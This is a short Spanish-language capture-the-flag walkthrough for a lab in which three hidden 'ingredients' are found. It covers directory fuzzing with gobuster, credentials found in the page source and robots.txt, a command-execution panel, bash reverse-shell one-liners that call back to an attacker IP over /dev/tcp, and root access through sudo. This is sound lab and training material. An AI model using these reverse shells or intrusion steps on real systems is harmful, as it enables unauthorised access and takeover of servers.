Es una ctf en la que hay que buscar 3 ingredientes.

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Al hacer Control + u en la web optenemos el usuario: R1ckRul3s

Fuzzing web:
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u 10.10.105.125 

/robots.txt -> En esta ruta optenemos la contraseña: Wubbalubbadubdub

-Hacemos fuzzing, esta vez que busque también con extension .php:

gobuster dir -w /usr/share/wordlists/dirb/big.txt -u 10.10.105.125 -x .php

/login.php

-Es un portal de login, ingresamos el usuario y la contraseña optenidos. Nos lleva a un panel con ejecución remota de comandos al servidor.

-Nos mandamos una reverse shell en bash:
Esta no funciona:
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
-Falla debido a restricciones del entorno, configuraciones de seguridad o limitaciones impuestas sobre el proceso original.

En cambio esta si:
bash -c  'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'

-La segunda versión funciona porque invoca un nuevo intérprete de Bash con un contexto diferente, permitiendo que las redirecciones y la reverse shell se ejecuten correctamente.

-El primer ingrediente se encuentra en /var/www/html/Sup3rS3cretPickl3Ingred.txt
-El segundo ingrediente se encuentra en /home/rick/'second ingredients'
-Para el tercer ingrediente hay que ser root.
## Escalada de privilegios

Es muy sencilla. El usuario www-data puede realizar cualquier comando:

www-data@ip-10-10-198-49:/var/www/html$ sudo su
root@ip-10-10-198-49:/var/www/html# cd /root
root@ip-10-10-198-49:~# cat 3rd.txt

